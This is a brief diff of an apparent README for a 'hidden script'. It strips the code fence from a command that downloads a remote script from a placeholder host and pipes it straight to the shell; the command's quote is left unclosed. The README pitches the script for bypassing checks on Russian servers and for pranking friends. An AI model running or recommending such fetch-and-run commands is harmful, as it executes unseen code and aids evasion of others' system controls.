@@ -12,9 +12,8 @@ This script performs the functions of a hidden script and also automatically lau
 
 Command to run the script:
     
-    ```bash
     sh -c "$(curl -sS https://example.com/.sh)
-    ```
+
 
 This script can be used to bypass checks on Russian servers with strict Linux checks, as well as to prank your friends or conveniently run Doomsday without having to download it in your browser.
 
